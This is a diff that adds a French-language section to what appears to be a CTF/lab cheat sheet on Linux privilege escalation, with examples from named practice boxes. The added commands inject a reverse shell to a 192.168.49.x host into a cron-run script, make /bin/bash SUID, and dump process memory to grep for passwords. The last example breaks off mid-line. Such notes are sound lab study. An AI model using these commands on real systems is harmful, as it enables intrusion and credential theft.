@@ -103,3 +103,34 @@ EOF
 # Exécuter avec PYTHONPATH modifié
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./script.py
 ```
+
+## Techniques d'élévation de privilèges Linux dans des Box
+### Exploitation de tâches cron
+Exemple (Flu):
+```bash
+# Identifier les tâches cron via pspy
+./pspy64
+
+# Injecter du code dans un script exécuté par cron
+echo 'sh -i >& /dev/tcp/192.168.49.x/9876 0>&1' >> /opt/log-backup.sh
+```
+Exemple (Ochima):
+```bash
+# Modifier un script de sauvegarde exécuté par cron
+echo "chmod +s /bin/bash" >> /var/backups/etc_Backup.sh
+# Attendre l'exécution puis:
+/bin/bash -p
+```
+### Exploitation de processus en mémoire
+Exemple (Pelican):
+```bash
+# Utiliser gcore pour dumper la mémoire d'un processus
+sudo /usr/bin/gcore 494
+strings core.494 | grep -i pass
+```
+### Exploitation d'applications Python
+Exemple (BitForge, RubyDome):
+```bash
+# Remplacer un fichier Python exécuté avec sudo
+echo 'import os; os.system("
+```
